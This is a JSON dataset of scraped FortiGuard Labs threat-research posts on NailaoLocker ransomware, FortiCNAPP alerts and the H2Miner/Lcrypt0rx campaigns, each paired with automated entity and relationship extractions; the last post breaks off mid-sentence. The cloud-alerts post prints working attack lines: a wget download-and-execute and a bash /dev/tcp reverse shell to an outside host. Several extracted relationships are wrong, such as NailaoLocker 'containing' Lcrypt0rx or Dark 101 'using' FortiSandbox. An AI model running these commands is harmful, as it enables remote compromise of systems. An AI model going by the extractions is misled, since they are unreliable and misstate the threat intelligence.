[
  {
    "title": "FortiGuard Labs Threat Research",
    "link": "https://www.fortinet.com/blog/threat-research",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (NailaoLocker, Malware), (SM2, Technique), (Lcrypt0rx, Malware), (Dark 101, Malware), (FortiCNAPP Composite Alerts, Tool), (Lcrypt0rx, Malware), (FortiCNAPP Labs, Tool), (FortiSandbox 5.0, Tool), (AI, Technique), (NordDragonScan, Tool), (TBK DVRs, Device), (Four-Fa, Device)\nRelationships: (NailaoLocker, uses, SM2), (NailaoLocker, contains, Lcrypt0rx), (Lcrypt0rx, uses, Dark 101), (FortiCNAPP Composite Alerts, linksWeakSignalsIntoClearTimelines), (Lcrypt0rx, uses, FortiCNAPP Labs), (FortiCNAPP Labs, uncovers, Lcrypt0rx), (FortiSandbox 5.0, detects, Dark 101), (Dark 101, uses, FortiSandbox 5.0), (NordDragonScan, utilizes, anEffectiveDistributionNetworkForDissemination)",
      "entities": [
        [
          "NailaoLocker",
          "Malware"
        ],
        [
          "SM2",
          "Technique"
        ],
        [
          "Lcrypt0rx",
          "Malware"
        ],
        [
          "Dark 101",
          "Malware"
        ],
        [
          "FortiCNAPP Composite Alerts",
          "Tool"
        ],
        [
          "Lcrypt0rx",
          "Malware"
        ],
        [
          "FortiCNAPP Labs",
          "Tool"
        ],
        [
          "FortiSandbox 5.0",
          "Tool"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "NordDragonScan",
          "Tool"
        ],
        [
          "TBK DVRs",
          "Device"
        ],
        [
          "Four-Fa",
          "Device"
        ]
      ],
      "relationships": [
        [
          "NailaoLocker",
          "uses",
          "SM2"
        ],
        [
          "NailaoLocker",
          "contains",
          "Lcrypt0rx"
        ],
        [
          "Lcrypt0rx",
          "uses",
          "Dark 101"
        ],
        [
          "FortiCNAPP Composite Alerts",
          "linksWeakSignalsIntoClearTimelines"
        ],
        [
          "Lcrypt0rx",
          "uses",
          "FortiCNAPP Labs"
        ],
        [
          "FortiCNAPP Labs",
          "uncovers",
          "Lcrypt0rx"
        ],
        [
          "FortiSandbox 5.0",
          "detects",
          "Dark 101"
        ],
        [
          "Dark 101",
          "uses",
          "FortiSandbox 5.0"
        ],
        [
          "NordDragonScan",
          "utilizes",
          "anEffectiveDistributionNetworkForDissemination"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 9
  },
  {
    "title": "NailaoLocker Ransomware’s “Cheese”",
    "link": "https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese",
    "content": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (NailaoLocker, Malware), (AES-256-CBC, Technique), (SM2 cryptographic key, Vulnerability), (Windows, Platform), (user files, File), (high severity level, Severity)\nRelationships: (FortiGuard Labs Threat Research, builtInDecryption, NailaoLocker), (NailaoLocker, uses, AES-256-CBC), (NailaoLocker, contains, SM2 cryptographic key), (NailaoLocker, executedBy, usysdiag.exe)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "NailaoLocker",
          "Malware"
        ],
        [
          "AES-256-CBC",
          "Technique"
        ],
        [
          "SM2 cryptographic key",
          "Vulnerability"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "user files",
          "File"
        ],
        [
          "high severity level",
          "Severity"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "builtInDecryption",
          "NailaoLocker"
        ],
        [
          "NailaoLocker",
          "uses",
          "AES-256-CBC"
        ],
        [
          "NailaoLocker",
          "contains",
          "SM2 cryptographic key"
        ],
        [
          "NailaoLocker",
          "executedBy",
          "usysdiag.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 4
  },
  {
    "title": "Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts",
    "link": "https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp",
    "content": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Cloud, Entity), (Multi-stage technique, Technique), (Authentication abuse, Technique), (Privilege escalation, Technique), (Command execution, Technique), (Cloud-native API, Tool), (IP address, IP), (Developer, Attacker), (Admin, Attacker), (Automation, Attacker), (Signature, Hash), (Rule, Hash), (Event, Hash), (Complication, Relationship), (Global Threat Landscape Report, Document), (Penetration testing, Technique)\nRelationships: (FortiGuard Labs Threat Research, detects, Cloud intrusions), (Cloud, uses, Multi-stage technique), (Multi-stage technique, involves, Authentication abuse), (Multi-stage technique, involves, Privilege escalation), (Multi-stage technique, involves, Command execution), (Multi-stage technique, involves, Cloud-native API), (IP address, associatedWith, Developer), (IP address, associatedWith, Admin), (IP address, associatedWith, Automation), (Signature, resolvesTo, Event), (Rule, resolvesTo, Event), (Event, executes, Complication), (Document, contains, Global Threat Landscape Report)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Cloud",
          "Entity"
        ],
        [
          "Multi-stage technique",
          "Technique"
        ],
        [
          "Authentication abuse",
          "Technique"
        ],
        [
          "Privilege escalation",
          "Technique"
        ],
        [
          "Command execution",
          "Technique"
        ],
        [
          "Cloud-native API",
          "Tool"
        ],
        [
          "IP address",
          "IP"
        ],
        [
          "Developer",
          "Attacker"
        ],
        [
          "Admin",
          "Attacker"
        ],
        [
          "Automation",
          "Attacker"
        ],
        [
          "Signature",
          "Hash"
        ],
        [
          "Rule",
          "Hash"
        ],
        [
          "Event",
          "Hash"
        ],
        [
          "Complication",
          "Relationship"
        ],
        [
          "Global Threat Landscape Report",
          "Document"
        ],
        [
          "Penetration testing",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "detects",
          "Cloud intrusions"
        ],
        [
          "Cloud",
          "uses",
          "Multi-stage technique"
        ],
        [
          "Multi-stage technique",
          "involves",
          "Authentication abuse"
        ],
        [
          "Multi-stage technique",
          "involves",
          "Privilege escalation"
        ],
        [
          "Multi-stage technique",
          "involves",
          "Command execution"
        ],
        [
          "Multi-stage technique",
          "involves",
          "Cloud-native API"
        ],
        [
          "IP address",
          "associatedWith",
          "Developer"
        ],
        [
          "IP address",
          "associatedWith",
          "Admin"
        ],
        [
          "IP address",
          "associatedWith",
          "Automation"
        ],
        [
          "Signature",
          "resolvesTo",
          "Event"
        ],
        [
          "Rule",
          "resolvesTo",
          "Event"
        ],
        [
          "Event",
          "executes",
          "Complication"
        ],
        [
          "Document",
          "contains",
          "Global Threat Landscape Report"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 13
  },
  {
    "title": "Old Miner, New Tricks",
    "link": "https://www.fortinet.com/blog/threat-research/old-miner-new-tricks",
    "content": "FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen.Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Tool Linux Windows Containers KinSing ✔️ Xmrig miners ✔️ ✔️ ✔️ Lcrypt0rx ✔️ Lumma stealer ✔️ DCRat ✔️ Cobalt Strike ✔️ Amadey ✔️ RustyStealer ✔️ ScreenConnect ✔️ The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Name Md5 Description curl-amd64 dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns kinsing b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell.Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. From (Hex) From (Key) To (Hex) To (Key) Notes E05B Left Windows 0000 Disabled Disable Left Win E05C Right Windows 0000 Disabled Disable Right Win 001D Left Ctrl 0000 Disabled Disable Left Ctrl E01D Right Ctrl 0000 Disabled Disable Right Ctrl 002A Left Shift 0000 Disabled Disable Left Shift 0036 Right Shift 0000 Disabled Disable Right Shift 0038 Left Alt 0000 Disabled Disable Left Alt E038 Right Alt (AltGr) 0000 Disabled Disable Right Alt 003B F1 0000 Disabled Disable F1 E053 Delete (Ext) 0000 Disabled Disable Delete E000 Null? (invalid) 0000 Disabled Malformed entry? 003C F2 0000 Disabled Disable F2 003D F3 0000 Disabled Disable F3 002E C 0000 Disabled Disable C 0032 M 0000 Disabled Disable M 0020 D 0000 Disabled Disable D 0014 T 0000 Disabled Disable T 001E A 0000 Disabled Disable A 001F S 0000 Disabled Disable S 0025 K 0000 Disabled Disable K 0031 N 0000 Disabled Disable N 0022 G 0000 Disabled Disable G 0012 E 0000 Disabled Disable E 0013 R 0000 Disabled Disable R 0017 I 0000 Disabled Disable I 0044 F10 0000 Disabled Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable 